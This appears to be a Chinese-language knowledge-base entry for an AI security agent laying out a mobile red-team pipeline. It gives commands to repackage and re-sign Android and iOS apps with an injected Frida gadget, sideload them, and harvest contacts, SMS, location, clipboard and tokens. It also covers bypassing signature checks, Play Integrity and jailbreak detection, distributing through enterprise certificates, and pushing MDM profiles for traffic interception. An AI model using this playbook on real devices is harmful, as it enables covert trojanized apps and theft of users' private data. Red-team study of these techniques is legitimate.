---
id: kb-mobile-redteam-pipeline
title: 移动 · 红队投递与后渗透流水线
domain: mobile
tier: 2
updated: 2026-10-25
source: Claude-BugHunter / apk-redteam-pipeline + ios-redteam-pipeline（合并重写）
keywords: ["移动红队","apk 投递","ipa 投递","侧载","sideload","重打包投递","frida gadget","objection","ios 越狱","trollstore","mdm","配置描述文件","企业证书","动态库注入","后渗透","通讯录","短信","定位"]
aliases: ["移动后渗透","侧载","重打包投递","ios 红队"]
negative: ["纯静态反编译"]
next: [apk-reverse, case-review]
---

# 移动 · 红队投递与后渗透

## 原理
逆向解决"看懂"，本流水线解决"投进去、跑起来、拿数据"：**投递载体**（重打包/侧载/MDM/企业证书）→ **运行时能力**（Frida gadget、动态库、辅助进程）→ **数据面**（通讯录/短信/相册/定位/剪贴板/Token）。

## 热路径
```
# Android
apktool d [APP].apk -o out/
unzip -o frida-gadget-android-arm64.so -d out/lib/arm64-v8a/
# 首个 Activity/Application 的 smali 里 System.loadLibrary("gadget")
apktool b out/ -o patched.apk
keytool -genkeypair -keystore t.jks -alias t -keyalg RSA -keysize 2048 -validity 3650 -storepass 123456 -keypass 123456 -dname "CN=t"
apksigner sign --ks t.jks --ks-pass pass:123456 --out signed.apk patched.apk
adb install -r signed.apk
# iOS（需越狱或可侧载）
unzip -o [APP].ipa -d ipa_out/
codesign -f -s "[CERT]" --entitlements ent.plist ipa_out/Payload/[APP].app
# 数据面
frida -U -f [PKG] -l collect.js
objection -g [PKG] explore -c "android shell_exec 'pm list packages'"
```

## 判据表
| 观察 | 判定 | 下一步 |
|---|---|---|
| debuggable=false 且校验签名 | 需重打包 + 过签校验 | hook getPackageInfo.signatures |
| 有 SafetyNet/Play Integrity | 需绕过完整性 | hook 返回固定 verdict |
| iOS 越狱检测（文件/URL scheme） | 需隐藏越狱 | Liberty Lite 或 hook 文件检查 |
| 企业证书可签 | 可侧载分发 | 注意吊销窗口 |
| MDM 描述文件可推 | 强制代理/根证书 | 走 MITM 全量流量 |

## 坑
- 重打包闪退 → 签名校验 / applicationId 变更导致 provider authorities 冲突。
- Frida gadget 被检测 → 改名 + 非默认端口 + 延迟加载。
- iOS 无越狱 → 只能企业证书侧载或 MDM，纯 hook 不通。
- 通讯录/短信属高敏 → 只记字段名与样本量，不落地明文。

## 产物
`case-<id>/mobile-pipeline.md`：投递载体、注入点、绕过项、数据面清单（字段级）、卸载与回滚步骤。
